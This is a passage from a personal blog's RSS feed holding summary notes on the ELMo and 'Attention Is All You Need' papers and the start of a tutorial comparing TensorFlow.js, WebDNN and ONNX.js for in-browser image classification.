&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;Including ELMo at both the input and output layers for SNLI and SQuAD improves over just the input layer. This is because SNLI and SQuAD use an attention layer after the biRNN and using ELMo at the output layer would allow the model to attend directly to the internal representations of the biLM. But for SRL (and coreference resolution) performance is highest when it is included at just the input layer. Probably because the task-specific context representations are more important than those from the biLM.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layerloc.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layerloc.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;The higher-level LSTM states of the biLM capture context-dependent aspects of word meaning (e.g., they can be used without modification to perform well on supervised word sense disambiguation tasks) while lower-level states model aspects of syntax (e.g., they can be used to do part-of-speech tagging).&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/contextcapture.PNG&#34; data-caption=&#34;biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/contextcapture.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Different layers in the biLM represent different types of information and explains why including all biLM layers are important for the highest performance in downstream
tasks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Using ELMo with a model also improves the sample efficiency. The model now requires a fewer number of epochs (parameter updates) and less amount of training data as well. For eg., the baseline SRL model requires 486 epochs to reach the maximum F1 score. The model with the ELMo representations only requires 10 epochs to exceed the baseline. In addition, ELMo-enhanced models use smaller training sets more efficiently than models without ELMo. Again, if we consider the SRL case, the ELMo model with 1% of the training set has about the same F1 as the baseline model with 10% of the training set.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/sampleeff.PNG&#34; data-caption=&#34;biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/sampleeff.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/ELMo.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Paper Notes #1 - Attention Is All You Need</title>
      <link>https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/</link>
      <pubDate>Sun, 18 Apr 2021 16:57:49 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: Attention Is All You Need&lt;br&gt;
&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://bit.ly/3aklLFY&#34;&gt;https://bit.ly/3aklLFY&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Authors&lt;/strong&gt;: Ashish Vaswani, Noam Shazeer, Niki Parmar, Jakob Uszkoreit, Llion Jones, Aidan N. Gomez, Lukasz Kaiser, Illia Polosukhin&lt;br&gt;
&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/tensorflow/tensor2tensor&#34;&gt;https://github.com/tensorflow/tensor2tensor&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
&lt;p&gt;Proposes Transformers, a new simple architecture for sequence transduction that uses only an attention mechanism and does not use any kind of recurrence or convolution. This model achieves SOTA (at the time) on the WMT 2014 English-to-French translation task with a score of 41.0 BLEU. Also beats the existing best results on the WMT 2014 English-to-German translation task with a score of 28.4 BLEU. The training cost is also much less than the best models chosen in the paper (at the time).&lt;/p&gt;
&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
&lt;p&gt;Existing recurrent models like RNNs, LSTMs or GRUs work sequentially. They align the positions to steps in computation time. They generate a sequence of hidden states as a function of the previous hidden state and the input for the current position. But sequential computation has constraints. They are not easily parallelizable which is required when the sequence lengths become large. The Transformer model eschews recurrence and allows for more parallelization and requires less training time to achieve SOTA in the machine translation task.&lt;/p&gt;
&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/arch.PNG&#34; data-caption=&#34;Detailed Transformer Architecture&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/arch.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Detailed Transformer Architecture
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The model is auto-regressive, it consumes the previously generated symbols as additional input when generating the next.&lt;/p&gt;
&lt;h3 id=&#34;encoder&#34;&gt;Encoder&lt;/h3&gt;
&lt;p&gt;The figure above shows just one layer of the encoder on the left. There are &lt;code&gt;N=6&lt;/code&gt; such layers. Each layer has two sub-layers - a multi-head self-attention layer and a position-wise fully connected feed-forward network. &lt;a href=&#34;https://www.cv-foundation.org/openaccess/content_cvpr_2016/papers/He_Deep_Residual_Learning_CVPR_2016_paper.pdf&#34;&gt;Residual connections&lt;/a&gt; and &lt;a href=&#34;https://arxiv.org/abs/1607.06450&#34;&gt;layer normalization&lt;/a&gt; is used for each sub-layer.&lt;/p&gt;
&lt;h3 id=&#34;decoder&#34;&gt;Decoder&lt;/h3&gt;
&lt;p&gt;This also has &lt;code&gt;N=6&lt;/code&gt; stacked layers. The architecture diagram shows one layer of the decoder on the right. Each layer has three sub-layers. Two of them are the same as the encoder. The third layer performs multi-head attention over the output of the encoder stack. This is modified to prevent positions from attending to subsequent positions. Additionally, the output embeddings are also offset by one position. These features ensure that the predictions for a position depend only on the known outputs for positions before it.&lt;/p&gt;
&lt;h3 id=&#34;attention&#34;&gt;Attention&lt;/h3&gt;
&lt;p&gt;The paper uses a modified dot product attention, and it is called &amp;ldquo;Scaled Dot Product Attention&amp;rdquo;. Given queries and keys of dimension d&lt;sub&gt;k&lt;/sub&gt; and values of dimension d&lt;sub&gt;v&lt;/sub&gt;, the attention matrix is calculated as shown below.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/attention.PNG&#34; data-caption=&#34;Attention Matrix Calculation&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/attention.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Attention Matrix Calculation
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Since, for large values of d&lt;sub&gt;k&lt;/sub&gt; the dot product grows large in magnitude, it pushes the softmax function into regions where it has extremely small gradients. The scaling of 1/sqrt(d&lt;sub&gt;k&lt;/sub&gt;) is done to avoid the problem of vanishing gradients.&lt;/p&gt;
&lt;p&gt;Multi-Head attention allows computing this attention in parallel. This helps to focus on different positions. Secondly, it also helps to attend to information from different subspaces due to the more number of attention heads.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/multihead-attention.PNG&#34; data-caption=&#34;Multihead Attention Calculation&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/multihead-attention.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Multihead Attention Calculation
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The paper uses &lt;code&gt;h=8&lt;/code&gt; parallel attention layers or heads. The reduced dimension of each head compensates for the more number of heads and hence the computational cost remains the same as with single-head attention with full dimensionality.&lt;/p&gt;
&lt;p&gt;Applications of multi-head attention in the paper are given below -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/application-attention.PNG&#34; data-caption=&#34;Application of multi-head attention in the model&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/application-attention.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Application of multi-head attention in the model
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/multihead-attention-fig.PNG&#34; data-caption=&#34;Pictorial representaion of Multi-head attention&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/multihead-attention-fig.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Pictorial representaion of Multi-head attention
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;h3 id=&#34;position-wise-feed-forward-networks&#34;&gt;Position-wise Feed-Forward Networks&lt;/h3&gt;
&lt;p&gt;The FFN sub-layer shown in the encoder and decoder architecture is a 2-hidden layer FC FNN with a ReLU activation in between.&lt;/p&gt;
&lt;h3 id=&#34;positional-encodings&#34;&gt;Positional Encodings&lt;/h3&gt;
&lt;p&gt;Positional encodings are injected (added) to the input embeddings at the bottom of the encoder and decoder stack to add some information about the relative order of the tokens in the sequence. The positional encodings have the same dimension as the input embeddings so that they can be added.
For position &lt;em&gt;pos&lt;/em&gt; and dimension &lt;em&gt;i&lt;/em&gt; the paper uses the following positional embeddings -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/positional.PNG&#34; data-caption=&#34;Positional Encoding calculation&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/positional.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Positional Encoding calculation
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;This choice allows the model to easily learn by the relative positions. The learned positional embeddings also perform about the same as the sinusoidal version. The sinusoidal version may allow the model to extrapolate to sequence lengths longer than the ones encountered in training.&lt;/p&gt;
&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/experiments.PNG&#34; data-caption=&#34;Experimental results when varying parameters&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/experiments.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Experimental results when varying parameters
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;Form (A), it can be seen that single-head attention is slightly worse than the best setting. The quality also drops off with too many heads.&lt;/li&gt;
&lt;li&gt;(B) shows that reducing the attention key size &lt;i&gt;d&lt;sub&gt;k&lt;/sub&gt;&lt;/i&gt; hurts model quality.&lt;/li&gt;
&lt;li&gt;In (C) and (D), it is visible that bigger models are better and dropout helps in avoiding overfitting.&lt;/li&gt;
&lt;li&gt;(E) shows that sinusoidal positional encoding when replaced with learned positional embeddings also does not lead to a loss in quality&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For the base models, the authors used a single model obtained by averaging the last 5 checkpoints, which were written at 10-minute intervals. The big models were averaged over the last 20 checkpoints. Beam search with a beam size of 4 and length penalty α = 0.6. The maximum output length during inference is set to input length +50, but if it is possible, the model terminates early.&lt;/p&gt;
&lt;p&gt;The performance comparison with the other models is shown below -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/results.PNG&#34; data-caption=&#34;Model performance&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-18_attention_is_all_you_need/images/results.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Model performance
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/Attention%20Is%20All%20You%20Need.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Deep Learning in the Browser - Exploring TF.js, WebDNN and ONNX.js</title>
      <link>https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/</link>
      <pubDate>Mon, 25 Jan 2021 12:53:13 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/</guid>
      <description>&lt;p&gt;After my &lt;a href=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy&#34;&gt;last post&lt;/a&gt; on deploying Machine Learning and Deep Learning models using FastAPI and Docker, I wanted to explore a bit more on deploying deep learning models. My last post discussed a server-side method for deploying the model. This post will discuss client side frameworks and techniques to deploy those models such that they work directly on the client side.&lt;/p&gt;
&lt;p&gt;In this tutorial I will be giving an overview of three frameworks, &lt;a href=&#34;https://www.tensorflow.org/js&#34;&gt;Tensorflow.js&lt;/a&gt;, &lt;a href=&#34;https://mil-tokyo.github.io/webdnn/&#34;&gt;WebDNN&lt;/a&gt; and &lt;a href=&#34;https://microsoft.github.io/onnxjs-demo/#/&#34;&gt;ONNX.js&lt;/a&gt;. I will be a deploying a simple pretrained image classification model (ResNet or Mobilenet) on the three frameworks and also tell you the comparsion between them. In this tutorial, I haven&amp;rsquo;t deployed custom models of my own but I will be explaining how you can do it and the difficulties you could encounter.&lt;/p&gt;
&lt;p&gt;The goal of this blog post is to introduce the three frameworks and how you can use them for deploying your models as well. Personally, I had not heard of WebDNN and ONNX.js before diving into this project, so I believe it can help some others like me to get familiar with these frameworks.&lt;/p&gt;
&lt;h2 id=&#34;tensorflowjs&#34;&gt;Tensorflow.js&lt;/h2&gt;
&lt;p&gt;I found Tensorflow.js to be the easiest to use. It already has a large collection of some &lt;a href=&#34;https://github.com/tensorflow/tfjs-models&#34;&gt;pretrained models&lt;/a&gt;. With Tensorflow.js, we don&amp;rsquo;t have a pretrained Resnet model because it is not exactly a lightweight model that can be deployed on a device with low compute power. So, I used &lt;a href=&#34;https://arxiv.org/abs/1704.04861&#34;&gt;Mobilenet&lt;/a&gt; (which is trained on the Imagenet dataset). Mobilenet was available in the Tensorflow.js pretrained models repository so I decided to use that directly.&lt;/p&gt;
&lt;p&gt;Now, on to the fun part, actually using the model and making a webapp. For the webapp portion, I am using &lt;a href=&#34;https://expressjs.com/&#34;&gt;Express&lt;/a&gt;, a web framework for Node.js. I have tried to keep the code structure and the webapp visually similar for all the three frameworks.&lt;/p&gt;
&lt;p&gt;Loading the model is as simple as -&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/dfedd9a445841a8bb963af9526a9f21c.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Now after loading the model, we call the &lt;code&gt;imgSet&lt;/code&gt; function which bascially loads the image from the path we specify and loads it onto a canvas. Details of this can be seen in the code which I will post at the end.&lt;/p&gt;
&lt;p&gt;Although the Mobilenet model in Tensoflow.js doesn&amp;rsquo;t require a fixed size of the image, but for uniformity in all other frameworks (WebDNN, ONNX.js), I decided to resize the images to 224x224 size. The main code for running the model is shown below -&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/3b1bc92aa52a13cabae2f426b36c2576.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The final webapp looks something like this -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/tfapp.gif&#34; data-caption=&#34;Image loading and prediction&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/tfapp.gif&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Image loading and prediction
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The model works well. It knows it is some kind of a water related animal, and given the Imagenet classes it has been trained on, it gies the closest result possible.&lt;/p&gt;
&lt;p&gt;The first prediction takes time (196ms) because the model is loaded and run for the first time. After that, the predictions take very little time (~80ms) mainly because the model is cached and predictions can be served faster.&lt;/p&gt;
&lt;p&gt;The average time taken by different backends (over 20 predictions) is also shown below -&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Time&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;cpu&lt;/td&gt;
&lt;td&gt;2100ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;wasm&lt;/td&gt;
&lt;td&gt;82ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;webgl&lt;/td&gt;
&lt;td&gt;70ms&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;If one wants to convert their own models to a Tensorflow.js compatible version, it is very easy to convert the model as well as load it into your web application. One can refer to &lt;a href=&#34;https://github.com/tensorflow/tfjs/tree/master/tfjs-converter&#34;&gt;tfjs-converter&lt;/a&gt; and the documentation given &lt;a href=&#34;https://www.tensorflow.org/js/guide/conversion&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The code for this section is present &lt;a href=&#34;https://github.com/shreyansh26/DeepLearning-in-the-Browser/tree/main/TF&#34;&gt;on my Github&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;webdnn&#34;&gt;WebDNN&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://mil-tokyo.github.io/webdnn/&#34;&gt;WebDNN&lt;/a&gt; was developed by the Machine Intellignece Laboratory at the University of Tokyo. From its website,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WebDNN optimizes the trained DNN model to compress the model data and accelerate the execution, and executes it with novel JavaScript API such as WebAssembly and WebGPU to achieve zero-overhead execution. WebDNN supports 4 execution backend implementations: WebMetal, WebGL, WebAssembly, and fallback pure javascript implementation. By using these backends, WebDNN works all major browsers.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;More details are available on the website, but the image below accurately depicts the steps involved in this procedure.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/webdnn-arch.PNG&#34; data-caption=&#34;WebDNN model conversion flow&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/webdnn-arch.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    WebDNN model conversion flow
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;WebDNN can be used to deploy tarined DNN models trained using popular DL frameworks like Tensorflow, Keras, PyTorch, Chainer, Kaffe. One disadvantage I found of using WebDNN is that the current model conversion module (as of writing the post) does not allow conversion using Tensorflow 2 and also does not support the latest versions of Keras (let alone &lt;code&gt;tensorflow.keras&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;I used a pretrained ResNet50 model (trained on Imagnet dataset) for this. I am sharing the &lt;a href=&#34;https://colab.research.google.com/drive/1pFdbZc5_Dd78twKshl-MH8T_EuVrH0Nw?usp=sharing&#34;&gt;following Colab notebook&lt;/a&gt; which contains the code to convert the ResNet50 Keras model.&lt;/p&gt;
&lt;p&gt;On to the web app coding part! The first thing the webapp does is to load the model.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/a527987583919e53b237a7d1a312f3a8.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Next, we write the code to run the model on the image input.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/a7a9eb637f31e9dee0a2b39822ebc4b7.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The final webapp looks something like this -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/webdnn.gif&#34; data-caption=&#34;WebDNN predictions&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/webdnn.gif&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    WebDNN predictions
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The model does a very good job of identifying it is a bus. The top two predictions relate to it.&lt;/p&gt;
&lt;p&gt;Again, the first run takes a long time (~242ms) but the subsequent runs take quite less (~63ms average). Now one must note that ResNet50 is a relatively heavier model as compared to Mobilenet, but WebDNN manages to load it much faster than or at par with Mobilenet as we saw in the case with Tensorflow.js. Also, in the COlab notebook, we can see that for the same image, the ResNet50 model around 645ms to run the model. We easily see a ~10x improvement on converting the model to WebDNN.&lt;/p&gt;
&lt;p&gt;The average time taken by different backends (over 20 predictions) is also shown below -&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Time&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;cpu&lt;/td&gt;
&lt;td&gt;10000ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;webgl&lt;/td&gt;
&lt;td&gt;60ms&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;WebDNN is quite optimised to run on futuristic hardware. The time it takes on a normal fallback vanilla-JS model version running on the CPU is around 10 seconds. But on WebGL, it takes much much less. I didn&amp;rsquo;t have access to a WebMetal backend, which they claim is the fastest. I would like to know if anyone runs it on WebGPU (WebMetal) and the average time the model took to run on it.&lt;/p&gt;
&lt;p&gt;The code for this section is present &lt;a href=&#34;https://github.com/shreyansh26/DeepLearning-in-the-Browser/tree/main/WebDNN&#34;&gt;on my Github&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;onnx&#34;&gt;ONNX&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://onnx.ai/&#34;&gt;Open Neural Network Exchange (ONNX)&lt;/a&gt; is an open source format for AI models, both deep learning and traditional ML.&lt;/p&gt;
&lt;p&gt;From their website -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ONNX defines a common set of operators - the building blocks of machine learning and deep learning models - and a common file format to enable AI developers to use models with a variety of frameworks, tools, runtimes, and compilers.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/onnxjs&#34;&gt;ONNX.js&lt;/a&gt; is an open source Javascript library by Microsoft for running ONNX models on browsers and on Node.js. Like Tensorflow.js and WebDNN, it also has support for WebGL and CPU. From theit Github&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;With ONNX.js, web developers can score pre-trained ONNX models directly on browsers with various benefits of reducing server-client communication and protecting user privacy, as well as offering install-free and cross-platform in-browser ML experience.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;With ONNX.js, I used a pretrained &lt;a href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/files/resnet50_8.onnx&#34;&gt;ResNet50 model&lt;/a&gt;.&lt;/p&gt;
